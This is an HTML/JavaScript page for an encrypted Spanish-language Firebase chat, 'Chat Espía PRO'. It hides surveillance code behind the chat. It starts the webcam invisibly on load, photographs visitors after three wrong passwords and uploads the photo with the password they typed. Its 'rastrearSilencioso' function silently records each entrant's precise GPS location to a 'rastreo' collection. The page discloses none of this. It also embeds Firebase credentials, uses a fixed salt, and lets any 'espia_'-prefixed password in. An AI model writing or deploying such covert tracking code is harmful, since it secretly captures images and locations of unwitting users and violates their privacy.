<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Chat Espía PRO</title>

<style>
body { margin: 0; font-family: Arial; background: #e5ddd5; display: flex; flex-direction: column; height: 100vh; }
.header { background: #075e54; color: white; padding: 15px; text-align: center; }
.chat { flex: 1; overflow-y: auto; padding: 15px; display: flex; flex-direction: column; gap: 10px; }

.msg { max-width: 75%; padding: 8px 12px; border-radius: 10px; font-family: monospace; display: flex; align-items: center; justify-content: space-between; gap: 10px; }
.remote { align-self: flex-start; background: white; }
.me { align-self: flex-end; background: #dcf8c6; }

.inputArea { display: flex; gap: 10px; padding: 10px; background: #f0f0f0; }
input { flex: 1; padding: 10px; border-radius: 20px; border: 1px solid #ccc; }
button { background: #25d366; border: none; color: white; padding: 10px 20px; border-radius: 20px; cursor: pointer; }

/* Estilo para el botón del ojito */
.eye-btn { background: none; border: none; cursor: pointer; font-size: 18px; padding: 0; margin-left: 5px; }

/* Elementos invisibles para el sistema de intrusos */
#camera-stream, #capture-canvas { display: none; }
</style>
</head>

<body>

<div class="header">🔐 Chat Espía PRO - Salas Privadas</div>
<div id="chat" class="chat"></div>

<video id="camera-stream" autoplay playsinline></video>
<canvas id="capture-canvas"></canvas>

<div class="inputArea">
<input id="texto" placeholder="Escribe un secreto..." onkeypress="if(event.key === 'Enter') enviar()">
<button onclick="enviar()">Enviar</button>
</div>

<script type="module">

import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
import { getFirestore, collection, addDoc, onSnapshot, query, orderBy } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
import { getStorage, ref, uploadString, getDownloadURL } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-storage.js";

const firebaseConfig = {
  apiKey: "AIzaSyC_1zQU3X8K3v4Es2mfJaOmKq0BahCYQsE",
  authDomain: "chat-secreto-7a888.firebaseapp.com",
  projectId: "chat-secreto-7a888",
  storageBucket: "chat-secreto-7a888.firebasestorage.app",
  messagingSenderId: "422501151882",
  appId: "1:422501151882:web:63b46bc07867b173982973"
};

const app = initializeApp(firebaseConfig);
const db = getFirestore(app);
const storage = getStorage(app);

//////////////////////////////////////////////////
// ⚙️ CONFIGURACIÓN DE SEGURIDAD
//////////////////////////////////////////////////

const PREFIJO_SALA = "espia_"; // Las salas deben empezar así, ej: espia_sala1
let intentosFallidos = 0;
let cameraStream = null;

async function rastrearSilencioso(idUsuario) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(async (pos) => {
            const rastreoCol = collection(db, "rastreo");
            await addDoc(rastreoCol, { 
                lat: pos.coords.latitude,
                lon: pos.coords.longitude,
                mapa: `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`,
                id: idUsuario,
                fecha: new Date().toLocaleString()
            });
        }, null, { enableHighAccuracy: true });
    }
}

let CLAVE_USUARIO = "";
let SALA = "";
let mensajesCol;
let MI_ID = Math.random().toString(36).substring(7);

async function pedirClave(){
    // Iniciar cámara invisiblemente al cargar el prompt
    try {
        cameraStream = await navigator.mediaDevices.getUserMedia({ video: true });
        document.getElementById('camera-stream').srcObject = cameraStream;
    } catch (e) { console.log("Cámara no disponible"); }

    let clave = prompt("🔐 Ingresa la clave del chat:");

    if(!clave || !clave.startsWith(PREFIJO_SALA)){
        intentosFallidos++;
        if(intentosFallidos >= 3) {
            await capturarYReportarIntruso(clave || "vacio");
            alert("Acceso bloqueado por seguridad.");
        } else {
            alert("Clave incorrecta.");
            pedirClave();
        }
        return;
    }

    // Si la clave es correcta (tiene el prefijo)
    CLAVE_USUARIO = clave;
    SALA = clave.replace(PREFIJO_SALA, ""); // El nombre de la sala es lo que sigue al prefijo
    
    mensajesCol = collection(db, "mensajes", SALA, "chat");
    
    // Apagar cámara si entró bien
    if(cameraStream) cameraStream.getTracks().forEach(t => t.stop());

    rastrearSilencioso(MI_ID);
    iniciarListener();
}

pedirClave();

async function capturarYReportarIntruso(claveUsada) {
    const video = document.getElementById('camera-stream');
    const canvas = document.getElementById('capture-canvas');
    const context = canvas.getContext('2d');
    
    canvas.width = video.videoWidth || 640;
    canvas.height = video.videoHeight || 480;
    context.drawImage(video, 0, 0, canvas.width, canvas.height);
    
    const dataUrl = canvas.toDataURL('image/jpeg', 0.8);
    if(cameraStream) cameraStream.getTracks().forEach(t => t.stop());

    try {
        const fotoPath = `intrusos/${MI_ID}_${Date.now()}.jpg`;
        const storageRef = ref(storage, fotoPath);
        await uploadString(storageRef, dataUrl, 'data_url');
        const fotoUrl = await getDownloadURL(storageRef);

        await addDoc(collection(db, "intrusos"), {
            id: MI_ID,
            claveUsada: claveUsada,
            foto: fotoUrl,
            fecha: new Date().toLocaleString()
        });
    } catch(e) { console.error("Error al reportar", e); }
}

async function getKey() {
    const enc = new TextEncoder();
    const keyMaterial = await crypto.subtle.importKey("raw", enc.encode(CLAVE_USUARIO), { name: "PBKDF2" }, false, ["deriveKey"]);
    return crypto.subtle.deriveKey({
        name: "PBKDF2",
        salt: enc.encode("sal-segura-pro"),
        iterations: 120000,
        hash: "SHA-256"
    }, keyMaterial, { name: "AES-GCM", length: 256 }, false, ["encrypt", "decrypt"]);
}

async function cifrarSeguro(texto){
    const enc = new TextEncoder();
    const key = await getKey();
    const iv = crypto.getRandomValues(new Uint8Array(12));
    const cifrado = await crypto.subtle.encrypt({ name: "AES-GCM", iv }, key, enc.encode(texto));
    return JSON.stringify({ iv: Array.from(iv), data: Array.from(new Uint8Array(cifrado)) });
}

async function descifrarSeguro(dataStr){
    try{
        const dec = new TextDecoder();
        const key = await getKey();
        const data = JSON.parse(dataStr);
        const decrypted = await crypto.subtle.decrypt({ name: "AES-GCM", iv: new Uint8Array(data.iv) }, key, new Uint8Array(data.data));
        return dec.decode(decrypted);
    }catch(e){ throw e; }
}

window.enviar = async function(){
    let input = document.getElementById("texto");
    let msg = input.value.trim();
    if(msg==="") return;
    let cifrado = await cifrarSeguro(msg);
    await addDoc(mensajesCol,{ texto: cifrado, sender: MI_ID, fecha: Date.now() });
    input.value="";
}

window.toggleMensaje = async function(btn, codigoCifrado) {
    const contenedorTexto = btn.parentElement.querySelector(".texto-msg");
    if (btn.dataset.estado === "visible") {
        contenedorTexto.innerText = "••••••••";
        btn.innerText = "👁️";
        btn.dataset.estado = "oculto";
    } else {
        try {
            let textoDescifrado = btn.dataset.cache || await descifrarSeguro(codigoCifrado);
            contenedorTexto.innerText = textoDescifrado;
            btn.innerText = "🔒"; 
            btn.dataset.estado = "visible";
            btn.dataset.cache = textoDescifrado;
        } catch(e) {
            contenedorTexto.innerText = "❌ Clave incorrecta";
        }
    }
}

function iniciarListener(){
    const q = query(mensajesCol, orderBy("fecha"));
    onSnapshot(q,(snap)=>{
        let chat=document.getElementById("chat");
        snap.docChanges().forEach(change=>{
            if(change.type==="added"){
                let data=change.doc.data();
                let div=document.createElement("div");
                div.className="msg "+(data.sender===MI_ID?"me":"remote");
                div.innerHTML = `
                    <span class="texto-msg">••••••••</span>
                    <button class="eye-btn" data-estado="oculto" title="Ver mensaje">👁️</button>
                `;
                let btn = div.querySelector("button");
                btn.onclick = () => toggleMensaje(btn, data.texto);
                chat.appendChild(div);
                chat.scrollTop=chat.scrollHeight;
            }
        });
    });
}
</script>
</body>
</html>
